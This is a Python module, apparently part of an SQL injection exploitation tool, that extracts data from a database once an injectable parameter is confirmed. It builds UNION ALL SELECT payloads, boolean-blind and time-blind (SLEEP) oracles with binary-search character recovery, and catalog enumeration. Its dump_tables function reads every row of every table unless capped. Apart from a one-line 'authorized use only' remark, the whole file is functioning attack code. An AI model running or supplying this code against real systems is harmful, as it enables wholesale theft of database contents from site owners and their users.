"""Data-extraction stage: pull data out once an injection is confirmed.

This is the exploitation half of the tool. A detector proves a parameter is
injectable and records how (channel + context); the Extractor then uses that
channel to read actual values from the database:

  - UNION channel  -> place a delimited expression in the reflected column and
                      parse the value straight out of the response. Fast; also
                      enumerates the current schema's table names.
  - Blind channel  -> reconstruct a value character-by-character via binary
                      search over a boolean or time (SLEEP) oracle. Slower and
                      length-capped; also enumerates databases / schemas / tables.

Authorized use only: this actively reads data from the target database.
"""

from __future__ import annotations

import re
import string
from dataclasses import dataclass, field
from difflib import SequenceMatcher

from .dbms import BOOLEAN_FINGERPRINTS
from .http_client import HttpClient
from .queries import CELL_SEP, Dialect, get_dialect
from .tamper import apply_tampers
from .target import Target

_BOOL_SAME_THRESHOLD = 0.95


def _token() -> str:
    import random

    body = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"xd{body}dx"


@dataclass
class ExtractionResult:
    channel: str
    dbms: str
    values: dict[str, str] = field(default_factory=dict)
    tables: list[str] = field(default_factory=list)
    databases: list[str] = field(default_factory=list)
    schemas: list[str] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)

    def is_empty(self) -> bool:
        return not self.values and not self.tables and not self.databases and not self.schemas

    def to_dict(self) -> dict:
        return {
            "channel": self.channel,
            "dbms": self.dbms,
            "values": self.values,
            "tables": self.tables,
            "databases": self.databases,
            "schemas": self.schemas,
            "notes": self.notes,
        }


@dataclass
class TableDump:
    """Contents of a single table pulled from the target database."""

    table: str
    columns: list[str] = field(default_factory=list)
    rows: list[list[str]] = field(default_factory=list)
    row_count: int = 0          # total rows reported by COUNT(*)
    truncated: bool = False     # True when row_count exceeded the dump cap

    def to_dict(self) -> dict:
        return {
            "table": self.table,
            "columns": self.columns,
            "rows": self.rows,
            "row_count": self.row_count,
            "truncated": self.truncated,
        }


class Extractor:
    def __init__(
        self,
        max_str_len: int = 64,
        max_catalog_len: int = 256,
        enumerate_catalog: bool = True,
    ):
        self.max_str_len = max_str_len
        self.max_catalog_len = max_catalog_len
        self.enumerate_catalog = enumerate_catalog

    async def _request(self, client: HttpClient, target: Target, param: str, value: str):
        value = apply_tampers(value, target.tampers)
        params = target.mutate(param, value)
        if target.is_get():
            return await client.request(
                target.method, target.url, params=params, cookies=target.cookies
            )
        return await client.request(
            target.method, target.url, data=params, cookies=target.cookies
        )

    async def _send(self, client: HttpClient, target: Target, param: str, value: str) -> str:
        return (await self._request(client, target, param, value)).text

    async def _elapsed(self, client: HttpClient, target: Target, param: str, value: str) -> float:
        return (await self._request(client, target, param, value)).elapsed

    async def extract(
        self,
        client: HttpClient,
        target: Target,
        param: str,
        finding: dict,
        dbms_name: str | None,
    ) -> ExtractionResult | None:
        detail = finding.get("detail", {})
        dialect = get_dialect(dbms_name or detail.get("dbms"))
        technique = finding.get("technique")
        if technique == "union-based":
            return await self._union(client, target, param, detail, dialect)
        if technique == "boolean-blind":
            return await self._boolean(client, target, param, detail, dialect)
        if technique == "time-blind":
            return await self._time(client, target, param, detail, dialect)
        return None

    # ---- UNION channel -------------------------------------------------------

    def _make_union_reader(self, client, target, param, detail: dict, dialect: Dialect):
        """Return an async ``read(expr)`` that evaluates one scalar SQL expression
        over the UNION channel and returns its string value (or None)."""
        context = detail.get("context", "quote")
        cols = detail.get("columns", 1)
        pos = detail.get("reflected_position", 1)
        base = detail.get("base_value", "")
        prefix = f"{base}'" if context == "quote" else f"{base}"

        async def read(expr: str) -> str | None:
            s, e = _token(), _token()
            concat_expr = dialect.concat(s, expr, e)
            select = ["NULL"] * cols
            select[pos - 1] = concat_expr
            payload = f"{prefix} UNION ALL SELECT {','.join(select)}-- -"
            text = await self._send(client, target, param, payload)
            m = re.search(re.escape(s) + r"(.*?)" + re.escape(e), text, re.DOTALL)
            return m.group(1) if m else None

        return read

    async def _union(
        self, client: HttpClient, target: Target, param: str, detail: dict, dialect: Dialect
    ) -> ExtractionResult:
        result = ExtractionResult(channel="union-based", dbms=dialect.name)
        read = self._make_union_reader(client, target, param, detail, dialect)

        for fact_name, expr in dialect.facts.items():
            try:
                value = await read(expr)
            except Exception:
                value = None
            if value:
                result.values[fact_name] = value

        await self._enumerate_catalog(read, dialect, result)

        if result.is_empty():
            result.notes.append("UNION channel confirmed but no values could be parsed.")
        return result

    async def _enumerate_catalog(self, read, dialect: Dialect, result: ExtractionResult) -> None:
        """List databases, schemas, and tables (all schemas when the dialect can)."""

        async def _split(query: str) -> list[str]:
            if not query:
                return []
            try:
                raw = await read(query)
            except Exception:
                return []
            if not raw:
                return []
            return [p.strip() for p in raw.split(",") if p.strip()]

        result.databases = await _split(dialect.databases_query)
        result.schemas = await _split(dialect.schemas_query)

        skip = {s.lower() for s in dialect.skip_schemas}
        schemas = [s for s in result.schemas if s.lower() not in skip]
        # Fall back to the current-schema table list when we couldn't
        # enumerate other schemas (unknown DBMS, query failed, …).
        if schemas and dialect.tables_in_schema_tmpl:
            seen: set[str] = set()
            for schema in schemas:
                names = await _split(dialect.tables_in_schema_query(schema))
                for name in names:
                    qualified = f"{schema}.{name}"
                    if qualified not in seen:
                        seen.add(qualified)
                        result.tables.append(qualified)
            if result.tables:
                return

        tables_raw = await _split(dialect.tables_query)
        result.tables = tables_raw

    async def dump_tables(
        self,
        client: HttpClient,
        target: Target,
        param: str,
        detail: dict,
        dbms_name: str | None,
        tables: list[str],
        max_tables: int | None = None,
        max_rows: int | None = None,
    ) -> list[TableDump]:
        """Dump table contents over the UNION channel (whole-database extraction).

        For each table (all of them unless ``max_tables`` caps it) this enumerates
        the columns, reads the total row count, then pulls the rows (every row
        unless ``max_rows`` caps it) one request at a time. ``None`` means no cap.
        """
        dialect = get_dialect(dbms_name)
        read = self._make_union_reader(client, target, param, detail, dialect)
        dumps: list[TableDump] = []

        selected = tables if max_tables is None else tables[:max_tables]
        for table in selected:
            try:
                cols_raw = await read(dialect.columns_query(table))
            except Exception:
                cols_raw = None
            columns = [c for c in (cols_raw.split(",") if cols_raw else []) if c]
            if not columns:
                continue

            try:
                count_raw = await read(dialect.count_query(table))
                count = int(count_raw) if count_raw and count_raw.strip().isdigit() else 0
            except Exception:
                count = 0

            want = count if max_rows is None else min(count, max_rows)
            dump = TableDump(
                table=table,
                columns=columns,
                row_count=count,
                truncated=want < count,
            )
            for i in range(want):
                try:
                    row_raw = await read(dialect.row_value_expr(columns, table, i))
                except Exception:
                    row_raw = None
                if row_raw is None:
                    continue
                cells = row_raw.split(CELL_SEP)
                # Pad/truncate to the column count so exports stay rectangular.
                if len(cells) < len(columns):
                    cells += [""] * (len(columns) - len(cells))
                dump.rows.append(cells[: len(columns)])
            dumps.append(dump)

        return dumps

    # ---- Blind (boolean) channel --------------------------------------------

    def _boolean_payload(self, context: str, base: str, condition: str) -> str:
        if context == "single-quote":
            return f"{base}' AND {condition}-- -"
        if context == "double-quote":
            return f'{base}" AND {condition}-- -'
        return f"{base} AND {condition}"

    async def _make_oracle(self, client, target, param, context, base):
        """Return an async ``truth(condition)`` predicate over the boolean channel."""
        baseline = await self._send(client, target, param, base)

        async def truth(condition: str) -> bool:
            payload = self._boolean_payload(context, base, condition)
            text = await self._send(client, target, param, payload)
            return SequenceMatcher(None, baseline, text).ratio() >= _BOOL_SAME_THRESHOLD

        return truth

    async def blind_fingerprint(
        self, client: HttpClient, target: Target, param: str, detail: dict
    ) -> str | None:
        """Identify the DBMS on a silent target via boolean inference probes."""
        context = detail.get("context", "numeric")
        base = detail.get("base_value", "")
        truth = await self._make_oracle(client, target, param, context, base)
        for dbms, probe in BOOLEAN_FINGERPRINTS:
            try:
                if await truth(probe):
                    return dbms
            except Exception:
                continue
        return None

    async def _extract_with_oracle(
        self,
        truth,
        dialect: Dialect,
        channel: str,
        *,
        fact_cap: int | None = None,
        catalog_cap: int | None = None,
    ) -> ExtractionResult:
        fact_limit = self.max_str_len if fact_cap is None else fact_cap
        list_limit = self.max_catalog_len if catalog_cap is None else catalog_cap

        async def str_length(expr: str, cap: int) -> int:
            lo, hi = 0, cap
            while lo < hi:
                mid = (lo + hi + 1) // 2
                if await truth(f"{dialect.length_of(expr)}>={mid}"):
                    lo = mid
                else:
                    hi = mid - 1
            return lo

        async def char_code(expr: str, pos: int) -> int:
            lo, hi = 0, 127
            probe = dialect.char_at_code(expr, pos)
            while lo < hi:
                mid = (lo + hi) // 2
                if await truth(f"{probe}>{mid}"):
                    lo = mid + 1
                else:
                    hi = mid
            return lo

        async def read(expr: str, cap: int | None = None) -> str:
            limit = fact_limit if cap is None else cap
            length = await str_length(expr, limit)
            chars = []
            for i in range(1, min(length, limit) + 1):
                code = await char_code(expr, i)
                if code == 0:
                    break
                chars.append(chr(code))
            return "".join(chars)

        result = ExtractionResult(channel=channel, dbms=dialect.name)
        for fact_name, expr in dialect.facts.items():
            try:
                value = await read(expr)
            except Exception:
                value = ""
            if value:
                result.values[fact_name] = value

        if self.enumerate_catalog:
            async def catalog_read(query: str) -> str | None:
                try:
                    value = await read(query, cap=list_limit)
                except Exception:
                    return None
                return value or None

            await self._enumerate_catalog(catalog_read, dialect, result)
            if result.tables or result.databases or result.schemas:
                result.notes.append(
                    f"{channel}: catalog names reconstructed via binary search, "
                    f"capped at {list_limit} characters per list."
                )
            else:
                result.notes.append(
                    f"{channel}: catalog enumeration ran but returned no names "
                    f"(lists capped at {list_limit} characters)."
                )
        else:
            result.notes.append(
                f"{channel}: table enumeration skipped (blind_enumerate=false)."
            )
        return result

    async def _boolean(
        self, client: HttpClient, target: Target, param: str, detail: dict, dialect: Dialect
    ) -> ExtractionResult:
        context = detail.get("context", "numeric")
        base = detail.get("base_value", "")
        truth = await self._make_oracle(client, target, param, context, base)
        return await self._extract_with_oracle(truth, dialect, "boolean-blind")

    async def _make_time_oracle(
        self, client, target, param, detail: dict, dialect: Dialect
    ):
        """Return an async ``truth(condition)`` that sleeps when the condition is TRUE."""
        base = detail.get("base_value", "")
        variant = detail.get("variant") or detail.get("context") or ""
        delay = int(detail.get("extract_delay") or 2)
        b1 = await self._elapsed(client, target, param, base)
        b2 = await self._elapsed(client, target, param, base)
        threshold = min(b1, b2) + delay * 0.7

        async def truth(condition: str) -> bool:
            payload = base + dialect.time_if(condition, delay, variant=variant)
            elapsed = await self._elapsed(client, target, param, payload)
            return elapsed >= threshold

        return truth

    async def time_fingerprint(
        self,
        client: HttpClient,
        target: Target,
        param: str,
        detail: dict,
        dialect: Dialect | None = None,
    ) -> str | None:
        """Identify the DBMS via time-based inference probes."""
        dialect = dialect or get_dialect(detail.get("dbms"))
        truth = await self._make_time_oracle(client, target, param, detail, dialect)
        for dbms, probe in BOOLEAN_FINGERPRINTS:
            try:
                if await truth(probe):
                    return dbms
            except Exception:
                continue
        return None

    async def _time(
        self, client: HttpClient, target: Target, param: str, detail: dict, dialect: Dialect
    ) -> ExtractionResult:
        truth = await self._make_time_oracle(client, target, param, detail, dialect)
        # Each TRUE bit costs a full sleep, so caps are tighter than boolean-blind.
        return await self._extract_with_oracle(
            truth,
            dialect,
            "time-blind",
            fact_cap=min(self.max_str_len, 32),
            catalog_cap=min(self.max_catalog_len, 64),
        )
